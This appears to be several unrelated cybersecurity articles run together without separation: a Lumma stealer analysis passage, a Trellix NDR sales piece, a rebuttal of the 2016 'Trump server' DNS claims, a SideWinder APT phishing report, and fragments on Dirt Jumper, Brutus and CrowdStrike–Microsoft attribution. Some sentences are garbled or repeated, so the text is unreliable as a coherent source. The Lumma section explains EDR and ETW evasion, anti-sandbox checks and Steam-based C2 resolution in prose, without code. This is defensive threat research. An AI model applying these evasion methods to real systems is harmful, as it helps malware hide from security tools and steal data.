On a 64-bit system, knowndlls/ntdll.dll is mapped.

Below listed NTAPI system call Indexes are resolved using their respective hash

API	Hash	Syscall Index
NtOpenSection	0x06519B84	0x37
NtMapViewOfSection	0xCB8D7CB0	0x28
NtUnMapViewOfSection	0xE40A7173	0x2A
NtClose	0x2C331E1F	0x3000F
Table 1 : API, respective hash values as generated by the malware and Syscall Index

Based on the remapped NTDLL, syscall table is re-generated, and the previously created hashtable is overwritten, it is unclear why the process is repeated twice. Probably, by loading NTDLL from disk, the malware aims on getting a clean, unhooked version of the DLL, which would prevent the EDR from detecting its activities because the hooks wouldn't be in place.

Below image depicts two NTDLL libraries loaded in memory, highlighted in red is the originally loaded NTDLL module library, highlighted in green is the remapped NTDLL library.

Figure 13: Lumma remapping the NTDLL library
Figure 13: Lumma remapping the NTDLL library

Post syscall generation, newly loaded NTDLL is unmapped using “NtUnMapViewOfSection “ and its handle closed using “NtClose”.

Disabling ETWTi callbacks
Lumma invokes the NtSetInformationProcess API, passing a structure that modifies the ProcessInformation class. By setting the Callback field to 0 in the structure, callbacks set by security softwares like ETW (Event Tracing for Windows) are removed and this prevents those software from monitoring the system calls made by Lumma stealer.

      argument
Figure 15: Twelve null-bytes are being passed as the ProcessInformation argument

Above image shows NtSetinformationprocess’s parameters, with third argument (ProcessInformation) set to null the callbacks

Anti-sandbox techniques
To avoid detection in sandbox environments, Lumma checks for the presence of specific sandbox or antivirus-related DLLs. The malware verifies that these DLLs are not loaded into memory, using the hardcoded hash values stored in Lumma’s .rdata section.

After validation, Lumma proceeds to the next stage. We wrote a python implementation of the hashing algorithm to obtain the below list of process names verified by Lumma to detect sandbox environments.

Hash	DLL name	Description
0xA7FD5028	avghookx.dll	AVG
0x8EF13DC7	avghooka.dll	AVG
0x25D20435	snxhk.dll	AVAST

0x23437B0F	cmdvrt64.dll	Comodo Container
0x187DF7E0	cmdvrt32.dll	Comodo Container
Table 2 : Analysis details of Lumma’s Dynamic hashing

For anti-analysis purposes, Lumma includes an optional feature to detect virtual machine (VM) environments. This check is performed based on the response from the Command and Control (C2) server, specifically by verifying if the response contains the property named “vm” set to "true". The command and control section below contains a detailed analysis of this feature.

Region specific execution
Lumma also includes a region-specific execution check. If the User Default Language is set to Russian (identified by the language code 0x419), the malware will exit with a prompt that the country is not supported.

Command and control, exfiltration
Dynamic analysis revealed that Lumma is calling multiple domains before calling the legitimate “steamcommunity.com”.

Figure 17: Lumma attempting to connect to the list of embedded
      domains
Figure 17: Lumma attempting to connect to the list of embedded domains

All strings related to C2 communications including domains, backup domains, header, and HTTP methods are stored in encrypted format.

For instance, an encrypted C2 domain is decrypted as “mercharena[.]biz”.

Steam as backup Domain
Lumma checks if the primary domain is available, If not, it attempts to reach the backup domains. In the event that all backup domains are unresponsive, Lumma will use the gaming website Steam[.]com to generate a C2 URL.

Lumma initiates a request to a Steam community profile at the following URL:
hxxps://steamcommunity.com/profiles/76561199724331900

From the response, Lumma extracts the Steam username and uses it to derive the C2 URL. Below image shows the usernames, used by the threat actor in the past. The usernames represent the C2 domain name in encrypted fashion.

Figure 21: Threat actor frequently modifies the steam usernames
Figure 21: Threat actor frequently modifies the steam usernames

For example, the HTML title tag in the profile page might be:

<title>Steam Community :: ytvzwlj-czxlyzg.df</title>
The username is initially encrypted, but the Lumma decrypts it to obtain the final C2 URL, which is:

hxxps://nikolay-romanov[.]su/
For this sample, the domain “mercharena[.]biz” was active and returned the expected “ok” response. Then, Lumma sends another POST request with body containing action(act) property as “recive_message” (with the misspelling of the word receive), version as “4.0” and  license ID as “f9tVYj--testik1”

In the modern cybersecurity landscape, Secure Service Edge (SSE) has become a vital framework for organizations aiming to secure access to cloud and on-premises environments. By integrating technologies like Zero Trust Network Access (ZTNA), Secure Web Gateway (SWG), and Cloud Access Security Broker (CASB), SSE ensures secure access to resources. However, while SSE excels at perimeter security, it falls short in detecting and responding to threats that bypass its defenses. This is where Network Detection and Response (NDR) becomes a critical addition.

The Gaps in SSE That NDR Fills
SSE solutions focus on securing traffic at the network edge but often lack the tools to monitor and detect threats within the internal network. Here’s how NDR complements SSE:


Internal Threat Visibility: While SSE secures north-south traffic (user-to-application), NDR provides visibility into east-west traffic (within the network), identifying lateral movement and anomalous behaviors.
Advanced Threat Detection: NDR uses AI-driven analytics and behavioral insights to detect zero-day attacks, insider threats, and other sophisticated exploits that SSE may miss.
Deep Packet Inspection: Unlike SSE, which relies on rule-based detection, NDR inspects raw network traffic to uncover hidden threats like data exfiltration or command-and-control communications.
How SSE and NDR Work Together
Combining SSE with NDR creates a layered security approach that addresses both external and internal threats. Here’s how they complement each other in key scenarios:

Threat Scenario
SSE Coverage
Why NDR is Needed
Insider Threats

Limited – Applies access control but cannot detect malicious insider behavior.

Detects unusual activities like large data transfers or unauthorized file access.

Lateral Movement

Limited – Secures access but doesn’t monitor internal network activity.

Tracks anomalous traffic patterns and attacker movement within the network.

Zero-Day Attacks

Weak – Relies on predefined rules that may not catch novel threats.

Uses AI-driven analysis to identify unknown attack behaviors in real time.

Compromised Credentials

Weak – Grants access based on credentials without monitoring misuse.

Detects suspicious login patterns or privilege escalations indicative of compromise.

IoT & Shadow IT Security

Limited – Does not monitor unmanaged devices or rogue endpoints.

Identifies unauthorized devices and anomalous traffic from IoT systems.

Why Trellix NDR Stands Out
Trellix’s Network Detection and Response solution offers unparalleled capabilities for organizations looking to enhance their security posture:

Comprehensive Visibility Across Environments: Trellix NDR monitors traffic across on-premises networks, hybrid clouds, branch offices, and IoT devices, eliminating blind spots.
AI-Driven Threat Detection: Leveraging advanced machine learning models aligned with the MITRE ATT&CK framework, Trellix NDR detects sophisticated threats like ransomware, advanced persistent threats (APTs), and insider attacks.
Proactive Threat Hunting: With deep packet inspection and real-time analytics, Trellix enables security teams to proactively hunt for threats before they escalate.
Seamless Integration: Trellix NDR integrates with existing security tools such as Security Information and Event Management (SIEM) platforms, Endpoint Detection and Response (EDR), and Extended Detection and Response (XDR) solutions for a unified defense strategy.
Best Practices for Implementing SSE + NDR
To maximize the benefits of combining SSE with NDR, organizations should consider the following strategies:

Adopt a Zero Trust Architecture: Use SSE to enforce strict access controls while leveraging NDR to monitor for anomalies that indicate potential breaches.
Leverage Behavioral Analytics: Deploy NDR solutions like Trellix that use AI-driven behavioral analysis to detect unusual patterns indicative of insider threats or compromised accounts.
Integrate Security Tools: Ensure seamless integration between SSE, NDR, and other tools like SIEMs or EDRs to create a unified view of your security environment.
Invest in Continuous Monitoring: Use NDR for 24/7 monitoring of east-west traffic across your network to identify lateral movement or data exfiltration attempts.
Enable Proactive Threat Hunting: Equip your security teams with tools like Trellix NDR that allow them to proactively search for hidden threats using packet-level data.
The Case for Security-in-Depth
Relying solely on SSE leaves organizations vulnerable to advanced threats that exploit internal network weaknesses. By adding NDR to your security stack, you achieve true security-in-depth:

SSE reduces the attack surface; NDR ensures no threats go undetected.
SSE secures perimeters; NDR monitors what happens inside the network.
Together, they form a robust defense against both external and internal threats.
Final Thoughts
In an era where cyberattacks are becoming increasingly sophisticated, organizations need more than just perimeter security—they need complete visibility into their networks to detect hidden threats before they cause damage. By combining Secure Service Edge with Network Detection and Response, businesses can create a resilient defense strategy capable of addressing today’s most pressing cybersecurity challenges.

If you’re an existing SSE customer looking to bolster your security posture, now is the time to consider adding Trellix NDR to your toolkit. With its advanced threat detection capabilities and seamless integration with existing tools, Trellix NDR empowers organizations to stay one step ahead of attackers.
The news of Trump's server making interesting outbound connections caught attention of many security researchers in October 2016 and many of us, nerds,  spent at least some time checking IP addresses, domains and looking at the logs. 

However, the logs that were kindly shared by Jean Camp brought more questions than answers. For example, we see a bunch of DNS lookups for the A records of MAIL1.TRUMP-EMAIL.COM , but not much more that would support the claims of the secret communications. A number of researchers looked at it and wrote detailed explanations of why it is just a marketing email server, unlikely to be used for clandestine communications, and why the DNS log correlation with the political events seems very circumstantial.  The fact that there was not enough information to make a final conclusion allowed that story to simmer until it flared up again in March, 2017 when Trump made allegations about the Trump tower wiretapping. 

The reason we are raising this story from the dead again is to provide additional evidence that the "Trump's server" used to be a marketing email server. We also offer our possible explanations to some of the events and question some premises and assumptions of the original disclosure. We may repeat a lot of good points made by Krypt3ia and Errata Security in order to turn this collection of events into to a more cohesive narrative.


Disclaimer: We analyzed the email messages, the leaked logs, public DNS and IP information. We seek technical correctness and will welcome additional data. Conclusions that were made in this article were not driven by political opinions, we did not vote for Trump and do not have any interests in Alfa Bank. If you find technical or factual errors, please let us know in comments or email.

Examples of emails sent from the server in 2011-2016
The samples of email messages below show that the server was used for sending newsletter offers for at least 5 years and likely longer.  We have a number of samples and mail logs of spam messages dated March 7, 2011-February 29, 2016. Please see below the email screenshots, list of subjects along with the partial string from each header, headers and screenshots of two messages.
Before we go into technical details, here is a list of points in a Q&A form.
Q:    Did Trump or his associates communicate with the Russian bank via his server?
A:    The messages were sent from one DNS server (Alfa Bank) to another DNS server (Cendyn) asking for the IP address of mail1.trump-email.com. The leaked logs that contain these queries do not give enough data to substantiate such claims.


Listrak Conf. Booth
Q:     Does that prove <insert anything related to Trump's claims about wiretapping, Russian computer hacking, Russian ties, etc?
A:    Despite various wild theories, the events described in the original post and the logs have no relation to the Trump's claims that his wires were crossed tapped. This post does not prove that he "has" or "has no" other connections to Russia or anything about Russian hacking or other foreign entities.  "The server " has never been the primary reason for the listed allegations.

Q:     Can that server in Trump tower be possibly bugged by Obama, the British or hacked by
someone who wants to accuse the president in communications with Russia.
A:    "That server" is the same server we are talking about and it is not in the Trump tower. The server mail1.trump-email.com 66.216.133.29 was located in the Lititz, PA datacenter of a reputable digital marketing company Listrak contracted by Cendyn.  Currently, the server with the IP address 66.216.133.29 is still in the datacenter and will be recycled for other needs. MAIL1.TRUMP-EMAIL.COM is pointing to a GoDaddy domain parking IP address (no actual server). TRUMP1.CONTACT-CLIENT.COM is still pointing to 66.216.133.29.

Q:    So, what happened then?
A:     

Mail flow before March 2016
From at least 2011 to March, 2016, Alfa Bank employees and many other recipients around the world received so called marketing emails (aka spam) from Trump Organization sent from MAIL1.TRUMP-EMAIL.COM. Digital marketing companies Cendyn and Listrak who provided the mailing services used their mail and DNS servers in Pennsylvania and Florida. Cendyn registered that domain for the Trump Organization, which already owns over 3500 domains (src. Domaintools). None of the servers were ever physically in the Trump's Tower.

In March 2016, Trump Organization changed the vendor and stopped using Cendyn's services. Since at least May 4, 2016 (earliest date in the logs), at least some of the companies that we believe received Trump spam in the past continued to make DNS lookup requests for IP address of MAIL1.TRUMP-EMAIL.COM.  Alfa Bank and Spectrum Health made many more lookups than others. Other IP addresses belong to a quarantine appliance run by an Anti-Spam cloud filtering provider MailCleaner, eCommerce Corporation mail service, Australian company called Shiftcare (software for home care services), Hostedmail.com, DNS server for small business hosting.
They did not directly connect to MAIL1.TRUMP-EMAIL.COM.  In addition, it is believed many other companies were seen by various ISP providers doing similar lookups.


DNS Lookups as seen in the logs until September 23, 2016
The circle "Logs that leaked" shows the conversation content
in the logs. This does not imply that the logs were stolen from
Cendyn's ns[1-3].cdcservices.com as this is not the only
source where they could come from.
There are concerns about the source of the logs
The logs span the period from May 4, 2016 to Sept. 23 2016 and contain DNS lookup requests made by Alfa Bank's DNS servers and the companies mentioned. Some IP addresses in the logs are not actual DNS servers but gateway IP addresses for those networks.

Alfa Bank and other companies made daily (1-70+ a day)  queries / DNS lookups asking for the IP address of MAIL1.TRUMP-EMAIL.COM that sent those spam emails, as seen in the email headers below.

These DNS lookups for domains and IPs inside messages that are not incoming but already delivered may be caused by any of the following: misconfigurations or glitches on email and mail filtering services, security appliances performing automated or search triggered lookups (DNS lookups on existing blacklists etc.), anti-spam mailbox store rescans, and endpoint level anti-spam products.
For example,  anti-spam systems are known to try to resolve and lookup every IP address and DNS name in the email message header, which can sometimes trigger unintended unsubscribe actions. For example, IETF Request for Comments RFC8058  "Signaling One-Click Functionality for List Email Headers" released in Jan. 2017 specifies rules for the broadcast marketing companies to help cope with unintended unsubscribe actions caused by anti-spam systems.

The exact reason for lookups can be only guessed, since only the companies themselves would be able to tell which of their systems caused it, assuming enough associated internal logs were saved to correlate. The reasons could be different for all companies - some of them made lookups for LINKS.TRUMP-EMAIL.COM  as all URLs in the emails used that subdomain. You can see example of those links in the header examples and in these Tweetbot posts.

On September 21, Alfa bank was reached for comments about the logs, which caused the number of lookups and their variety skyrocket as their security team started the investigation.
The author of the original disclosure states that the lookup errors started on September 22, 2016 because Cendyn removed the DNS zone for mail1.trump-email.com from ns1 and ns3.cdcservices.com. These were two Cendyn DNS servers in Ft.Lauderdale, FL. The second, ns2.cdcservices.com, is located in Boca Raton, Fl. Considering that Trump was not their client since March 2016, the hasty and belated removal was either co-incidence or reaction to being notified and realizing that the zone, or domain should have been removed long ago.
Passive DNS logs show only when the subdomain is first seen, not when created or assigned.  The fact that TRUMP1.CONTACT-CLIENT.COM showed up in the passive DNS logs on Sept. 30 could be attributed to testing if the server is reachable using the new (or existing) freebie domain (Cendyn creates them for each customer), especially if they indeed still used it for CRM software that "CenDyn provides to the Trump Organization". 

On September 27, Alfa Bank made a DNS request for the new TRUMP1.CONTACT-CLIENT.COM. Considering, that at that time the computer security department was performing investigation of the claims, it is not surprising. The domain was likely coaxed by various lookups and queries performed by their IT department. For example, you can see sudden appearance of queries for  MAIL.TRUMP-EMAIL.COM (Mail without 1) from Alfa Bank 217.12.96.15 on September 22, which can be  attributed to the investigation too.

Q:     Did you see Alfa Bank's statement on March 17, 2017 that they were hacked and thus those connections to the Trump's server were made by hackers to look like Alfa Bank did it. (src. Circa)
A:     It is possible to send a lot of DNS traffic, or other requests and perform an attack (DDoS or other) without actually "hacking" the victim. They were not "hacked" in this particular case, in the sense of someone infiltrating their network, nor do they say that.  Alfa Bank received a lot of DNS queries and DNS replies to spoofed requests after the news came out. We are sure that many of those requests are the result of various researchers trying things. 1340 DNS queries is not a large number. And no, we didn't do it. 

While it is possible to spoof DNS requests and make them look like they came from Alfa Bank, it is not a convincing theory for events before September 23, 2016. From the logs provided, there were 7 other companies seen over the course of  4.5 months doing the same type of lookups.

We think the DNS spoofing attacks that happened in 2017 as reported by Alfa Bank were spurred by all the news about the mysterious DNS communications channel used by Trump and Russians. Many researchers and hackers would try all kinds of queries to elicit server responses and some possibly tried to make it look like the 'secret' communications continue.  The evidence of those research efforts can be seen on the Farsight pDNS search for TRUMP-EMAIL.COM, where some recent entries include 'new' subdomains like you see below. The cause for these is the fact that TRUMP-EMAIL.COM uses a wildcard DNS record, so queries for its random subdomains will resolve successfully and show up in the database (if seen by any pDNS sensors).

We should note that Cendyn transferred the TRUMP-EMAIL.COM domain to Trump Organization on March 8, 2017, thus all attempts to resolve the domain since that date would return the IP address of GoDaddy domain parking server.

Claims and Counterclaims:  
Before May 2016:
Claim 1: 
Trump campaign press secretary Hope Hicks:  “First of all, it’s not a secret server. The email server, set up for marketing purposes and operated by a third-party, has not been used since 2010. The current traffic on the server from Alphabank’s [sic] IP address is regular DNS server traffic – not email traffic.”  (Src. Guardian)
 Response 1:
As you see in the last message header As you see in the last message header here, the last message was received from that server MAIL1.TRUMP-EMAIL.COM on the IP address 66.216.133.29, the last message was received from that server MAIL1.TRUMP-EMAIL.COM on  66.216.133.29 on February 29, 2016.(src. DeepEnd Research)
This tweetbot was still posting links from Trump Hotel's marketing emails in February with the last one on Feb. 29, 2016 (src. Twitter)
 Cendyn acknowledged that the last marketing email it delivered for Trump's corporation was sent in March 2016" (Src. CNN)

May 2016 - September 23, 2016. Logs and log time period:
Claim 2:
Trump and Russia’s largest private bank communicated via a hidden server since at least 2016 May. (src. GDD)
Response 2: Not hidden and did not communicate intentionally
As it was already pointed out by many, the sever is located in a server farm that belongs to a hosting company and is one of many used by Cendyn (the company used by Trump Organization for mailing services). It is not more hidden than any server of any cloud services provider.

Response 3:
Robert Graham from Errata Security already explained that this is how Listrak configures email marketing servers. (src. Errata Security).  
As for "outside of SPF range", Cendyn's SPF records for TRUMP-EMAIL.COM and CONTACT-CLIENT.COM (envelope sender) included MX, which is the same for all their domains -  incoming.cdcservices.com . MX entry in SPF records makes it unnecessary to list all the IPs. The only downside and limitation about using MX entry instead of IPs is that it works only for servers that only do sending, not receiving - which is what that server was built to do.

 Robert Graham already covered it. (src. Errata Security)  
Claim 8:  
CenDyn stated the reason they recreated a trump1.contact-client.com hostname pointing to this same IP address was for the Trump Organization to use the CRM software CenDyn provides to the Trump Organization."  (src. LJean.com)
Response 8: 
It is possible they needed to use TRUMP1.CONTACT-CLIENT.COM after they removed EMAIL1.TRUMP-EMAIL.COM  We do not know when it happened. We know when TRUMP1.CONTACT-CLIENT.COM showed up in the DNS logs and passive DNS database, but it is not a direct evidence of the creation and assignment date.  
Claim 9:  
"CenDyn states that their servers are not dedicated to a specific client. Yet the Internet-Wide Scan Data Repository (scans.io) data show that the hostname mail1.Trump-Email.com has been stable since at least 2013. It did not change for three years, then did change on on 23 September 2016. At the time of this writing, 2 October 2016, no other hostname has pointed to this IP 66.216.133.29:just trump1.contact-client.com and mail1.trump-email.com. So this IP address is associated with only that server. "  (src. LJean.com)


Response 9:
This is correct. It appears that 66.216.133.29 was dedicated to Trump Organization. PTR records are still not updated.

Claim 10:
DNS was possibly used to conceal data and commands within DNS traffic using the technique called DNS tunneling (as many ask on Twitter)
Response 10:
It does not seem to be the case, if based on the provided logs.  They show "A" records only. "A" records are used for transferring only IP addresses.  DNS tunneling would be possible if those were "TXT" or "CNAME" type records that can hold arbitrary non-formatted text strings.

September 21, 2016 - October 5, 2016 As requests for comments were sent to Alfa Bank
Claim 11:"When a reporter called Alfa Bank for comment on September 21, the zone for mail1.trump-email.com was removed from ns1 and ns3.cdcservices.com causing RCODE=2 (Server Failure), and ns2 returned empty referrals"(src. GDD)
    "One of the intriguing facts in my original piece was that the Trump server was shut down on Sept. 23, two days after the New York Times made inquiries to Alfa Bank (and a week before the Times reached out to Trump)." (src. Slate)

Trump, CenDyn or some other party associated with the domain sought to erase the mail1.Trump-Emal.com host by deleting forward resolution zones.  So the domain name was removed from the normal way one would look up a domain. However, the reverse delegation still exists as of 2 November 2016."  (src. LJean.com)
Response 11:
The server as machine on 66.216.133.29 in the Listrak datacenter is still up so it was not shut down.
Passive DNS shows that "A" record MAIL1.TRUMP-EMAIL.COM was last seen on 66.216.133.29 on 2016-09-13.  Since Trump company 'ditched' Cendyn in March 2016, eventual cleanup of DNS records had to happen - eventually.  We don't know if they were contacted regarding the matter on or before September 22, 2016. If they were, it would be a normal knee-jerk reaction to the inquiry.
They removed records only from the Ft. Lauderdale servers (NS1 and NS3) but not NS2 in Boca Raton (different admins?). It was noted by many that they also forgot to remove PTR record for mail1.trump-email.com and it is still pointing to 66.216.133.29 even though A record was finally assigned to GoDaddy domain parking 184.168.221.22 on March 8, 2017 (after transferring domain back to Trump org). 

Claim 12: "Alfa Bank knew that Trump renamed his host through ongoing email delivery and HELO/EHLO resolutions, or another channel.  Trump and Alfa Bank have since coordinated their move to an office communications channel." (src.  GDD)
Response 12:
Not sure what the author means by "an office communications channel".  The requests for comments for the Alfa Bank were made on September 21, 2016. On September 27, 2016 the Alfa bank DNS server made a lookup for TRUMP1.CONTACT-CLIENT.COM. Considering that they did their investigation of the claims, it is not unexpected that their security people finally found and queried the other domain associated with the IP.
Claim 13: "The hostname trump1.contact-client.com appeared in the first passive DNS

Over 500 subdomains.
via PassiveTotal pDNS
database three days later, and still has not appeared in some passive collections." (src.  GDD)


Response 13:
Passive DNS collections are passive. They see a lot but not every successful resolution on the web. (see more at PassiveTotal FAQ or  Farsight pDNS FAQ )
October 5, 2016 - March 8, 2017 Post-Disclosure
Claim 14:  
In March 2016, Cendyn said it "transferred back to" Trump's company the mail1.trump-email.com domain. (Src. CNN)
Response 14:
Yes, they did transfer the domain control on 2017-03-08. Since then, MAIL1.TRUMP-EMAIL.COM and all subdomains resolve to 184.168.221.46 - GoDaddy Parking (IP address for domains without associated hosting servers) 
Claim 15: 
Alfa Bank claims that the recent attacks in February and March 2017 are intended to make it look they continue the secret communications with the Trump server.
Response 15:

2017-02-17 According to the Alfa Bank press release on 2017-03-17,  on 2017-02-17 computers in USA sent requests to "Trump Organization server" and made it look like it came "from various variants of MOSCow.ALFAintRa.nET", thus the "Trump's server's" replies were sent to Alfa bank.(src. Alfa Bank and Circa).
 The press releases often go through several layers of editing which could affect the technical accuracy of the text. For example, here we can assume that by the Trump Organization server they mean Cendyn's DNS server for MAIL1.TRUMP-EMAIL.COM and that server received DNS queries for MAIL1.TRUMP-EMAIL.COM that came from Alfa Bank spoofed IP addresses. DNS servers do not record domain names of incoming requestors, so it is not entirely clear where they saw MOSCow.ALFAintRa.nET. Not questioning the fact of the attack but it is hard to say what happened without actual logs or more technical data.
2017-03-11 and 2017-03-13 According to the Alfa Bank press release on 2017-03-17, on 2017-03-11 and 2017-03-13 their systems received 1340 DNS replies to the queries they did not send for mail.trump-email.com.moscow.alfaintra.net.(src. Alfa Bank and Circa)
Again, it looks like press release is lacking technical accuracy, which is ok.
In general, sending DNS request from spoofed IP addresses (crafted packets) is very easy. Often attackers use nonexistent subdomains to force their recursive DNS server to forward each of their queries to the authoritative DNS server for that domain instead of using cached answers, thus overloading it. DDoS does not seem to be the goal but more like malicious experimenting. 
Claim 16:
But experts claim it is <unusual, odd.. etc>

Response 16: 
In tech speak, epithets like "odd", "weird", "not normal" do not really mean clandestine or paranormal. These are highly technical terms meant to convey that existing evidence is too limited to allow one extrapolate the possible scenarios.  I am not speaking for every comment out there but am suggesting not to jump to conclusions when a nerd calls something "odd".

A few months ago, Trend Micro released a post which encapsulated the SideWinder APT group activity in the past year, showcasing SideWinder’s mobile malware development aspirations and spear phishing campaigns targeting the government and military of Nepal, the government of Afghanistan, the Myanma Posts and Telecommunications state owned company, the Chinese Ministry of Foreign Affairs, and several other entities.

The SideWinder APT which is also tracked as RAZOR TIGER, APT-C-17, and Rattlesnake is known to pick its targets in the South Asia region in multiple previous campaigns [1, 2, 3]. SideWinder’s targets mainly consist of the countries of Nepal, Pakistan, Afghanistan, and China along with some other target countries from the group’s known past activity. This threat group is somewhat believed to be associated with Indian interests and seems to mainly choose to target government and military entities in its espionage attacks.

While we were hunting through world scan data provided by BinaryEdge, we encountered an interesting server during our research which was hosting an executable file that led us on a path to uncover a renewed set of activity being conducted by the SideWinder group - picking right where they left off from in their previous year of operation.

Key Findings:
The group renewed its spear phishing activity with new domains registered targeting government entities in Nepal.
Nepal recently cancelled its upcoming elections scheduled for 30 April and 10 May 2021.
Uncovered evidence of the group likely targeting Nepal's Election Commission.
Evidence of continued efforts of malware development being conducted by the group.

Command and Control
The server which was the initial point in our investigation was hosting the following shellcode we identified in the scan response we checked on port 8087.
 

Server's raw response showing an expected C2 domain connection.

Outputting this raw data for initial analysis and triage, we managed to figure out this was most likely 2nd stage malware being used for Command and Control purposes through this server.
 


PE-Studio showing us the malware's used libraries, headers, references, and compilation date.

And as we continued our search throughout the server, we realized that it was also communicating with what looked to be 1st stage malware via port 8085. We think that such 1st stage malware is being used in SideWinder’s spear phishing attacks, and we suspect that a sample of one was uploaded in January to VirusTotal.
 
Upon further search, we managed to find the 2nd stage payload that was being used by the group and hosted on this server via a simple text file encoded in Base64. After a straightforward decode, we were able to see the code used by the threat actor for the 2nd stage payload they are utilizing.

Meterpreter 2nd Stage Payload code excerpt.

We immediately had our assumption verified, as we were able to see that the server is being used for command and control purposes using a meterpreter based payload written in Python.

First Stage Payload
An example of what we suspect this group is using that precedes the command and control infrastructure we first laid eyes on was this malware file uploaded to VirusTotal:


An .hta file most likely attached to spear phishing emails.

We suspect that this actor is using malicious .hta files that are attached to emails containing links to decoy document lures along with embedded 1st stage malware inside the hta files. Here we see such an embedded link to a PE-file being disguised as a txt file being used to deploy spyware upon execution.


Once this spyware is downloaded the malware will check for the environment it’s running in and attempt to identify the infected machine’s IP address with an external HTTP request.




External request to an online IP check API.

Another Python based malware, this specific sample runs in the background after execution and creates a database file of extracted logins from browser files, creates archived files of all of the infected machine's downloads, documents, and desktop files to a then daunting task of exfiltration.

Utilizing the WriteFile function to write the stolen data to files.
Immediately after execution the malware attempts to steal files, writing the stolen browser data to a "Loginvault.db" file and .zip files using the folder location, the machine's IP address and datestamp as the naming scheme.


Exfiltration attempt to the C2 server using port 8080.

This spyware sample takes us directly to the spear phishing efforts we suspect SideWinder may be conducting while using similar malware techniques.

Spear Phishing



Another finding that we encountered while searching through the contents and configurations of this server were the decoy pages SideWinder is using to phish against their intended targets. When we looked at what was being hosted we were surprised to find the server as a single staging point for a lot of the group’s phishing activity (on top of some mobile malware development efforts we cover further along in the post).

The server we were investigating was using various dynamic DNS resolutions to the main IP address and resolving almost all of the domain names with naming schemes that mimic the naming convention of the real entities SideWinder are targeting.

SideWinder are still very adamant at focusing their attention on the same entities they’ve previously attempted to target as showcased by Trend Micro’s report, while adding some additional in-country organizations to their target list.

As of the last few weeks, it seems this group has renewed its activity and started to ramp up attack efforts against their targets of choice. For example, through our investigation of the server, we’ve managed to find that the group is renewing their efforts against government entities of Nepal and setting up phishing infrastructure to launch such campaigns.

In our findings, it seems that SideWinder has added the Ministry of Physical Infrastructure and Transport of Nepal to their list of targets and are still actively trying to gain access to other government offices of the country.


Ministry of Physical Infrastructure and Transport of Nepal domain and login panel.

Another such target in Nepal is the Ministry of Foreign Affairs with a preceding lure intended on motivating the recipient to login with their credentials to be able to continue reading the decoy article planted by the threat actor. In this case, a press release by the Nepal Mission to the UN pertaining to the COVID-19 situation around the region, and human rights issues.


Ministry of Foreign Affairs decoy lure.

A short while after accessing the link the unsuspecting reader will be redirected to the Ministry’s login page.


After a redirect from the lure article, the reader is redirected to this login panel.

Here CapTipper is showcasing us the ~15 seconds it takes to get redirected from the initial decoy article to the login panel.



The phishing efforts being conducted by the group in this activity are reliant on the content delivery backbone of the actual target website to deliver all of the page's media and redirect to it once credentials are entered. Meaning the actor controlled server just hosts basic phishing kits which use the target's own content delivery network to mimic the respective login panel which they are targeting.


The fake page making lookup requests to the real Nepal Foreign Affairs government website.

Some other decoy tricks that are being employed by the group in this campaign are error messages hardcoded in the phishing pages. Such as the one in a phishing page spoofing the Nepal central government email system:


Source code showing the hardcoded error message.

Or an additional one hardcoded in the phishing page targeting the Ministry of Defense:


Ministry of Defense login panel with a hardcoded error.

We imagine this is a social engineering tactic employed by the actor in efforts of achieving further enticement to enter login credentials by adding pretext to complete the action.

We have also witnessed renewed attention in efforts against organizations such as the Nepal state owned Nepal Telecom company, while continuing the techniques of utilizing the real website’s content backbone including the reCaptcha widget.
We also can’t confirm that all of the phishing infrastructure we uncovered will indeed be infected with malware or have a preceding malicious payload once in use. Even with the proximity of the phishing pages residing on the same server with other malware it remains unclear at this stage. Some of these pages may very well be used in single purpose credential phishing campaigns.

On the other hand, what we did cover in this post indicates how SideWinder is very much focused on conducting espionage operations against their target area of interest in South Asia. Taking into account what this group has done in the past year; we see that we should take this renewed activity as an indication that SideWinder will only continue to ramp up its activities in the rest of the upcoming months of 2021 and beyond.

The group’s continued interest in Nepal serves as evidence to that – We can only speculate that regional developments such as the potential elections in countries of the region, geopolitical tensions such as the military clashes in the India-China border, international events mixed in with regional efforts such as COVID-19 vaccine distribution, and other regional interests will only continue to fuel such campaigns conducted by the group in South Asia. We should anticipate more of such spear phishing activity and further development of their malware and specific mobile malware capabilities to launch such campaigns against the group’s targets of interest.
I recently encountered a malware sample that when sandboxed, exhibited a great deal of DDoS-like activity toward a large number of URLs. When I looked at the network traffic a bit more closely, it reminded me of the Dirt Jumper DDoS bot that I read about in an excellent blog post by Curt Wilson of Arbor Networks. This particular version of Dirt Jumper is attacking a variety of organizations and companies in many different countries. The MD5 of this sample is f29b1089b3f5e076d4d4bd2a3a02d3cb using the domain 'asdaddddaaaa.com' for its Command and Control (C&C). Searching for a similar network traffic pattern yielded a number of sandbox analysis pages containing several more C&C servers and DDoS victims. This research also highlighted a lack of proper detection of this bot variant. Many antivirus companies change the name of this bot across variants, detecting it as zbot, pinkslipbot, Kryptic and others. Microsoft at least consistently detects Dirt Jumper as Dishigy.B,  (Dishigy.A is a non-related keylogger with binary in the same directory) and this allowed us to find more examples and prompted further research.  Dirt Jumper is proving to be as popular as Darkness/Optima bot we described earlier this year and is gaining more buyers in underground market due to easy implementation and powerful attack methods.

What is Brutus Password Cracker For?
In cryptanalysis and computer security, password cracking is the process of recovering passwords from data that have been stored in or transmitted by a computer system. A common approach (brute-force attack) is to try guesses repeatedly for the password and check them against an available cryptographic hash of the password.

In cybersecurity, understanding an adversary’s identity, capabilities, and intent is critical to intelligent cyber defense. Attribution matters. Despite cyber threat intelligence tracking a multitude of threat actors for many decades, accurately attributing malicious activity continues to be difficult. Vendors and researchers often see different parts of the same puzzle — or entirely different puzzles — due to differences in telemetry. Organizations also have different standards and analytic maturity, which results in varying levels of visibility into threat activity and divergent perspectives on what’s being tracked.

Cybersecurity leaders, executive teams, and boards increasingly seek clear answers: Who is targeting us? How are they doing it? And why? To deliver those answers, attribution must be clearer, faster, and more consistent. 

As cybersecurity becomes increasingly central to business resilience and national security, the challenge of adversary attribution has grown more urgent. Over the past several decades, multiple naming systems have emerged — each shaped by the unique vantage points of vendors and researchers. While these systems offer valuable insights, they’ve also created fragmentation, confusion, and complexity.

While a single universal naming standard is not practical and may not be possible, defenders shouldn’t have to spend countless cycles trying to delineate if COZY BEAR is the same as APT29, or UNC2452, or Midnight Blizzard.​

We believe the industry must do better and we’re taking the lead with our partners to make that happen.

Bringing Clarity to Cyber Threat Attribution Across Vendors
Today, CrowdStrike and Microsoft announced a strategic alliance to bring clarity and coordination to the way organizations label threat actor groups.​ This strategic collaboration represents the efforts of two organizations to put the customer first, because good versus evil is the true fight. Together, we chose to prioritize the good fight to help make the world more secure. 

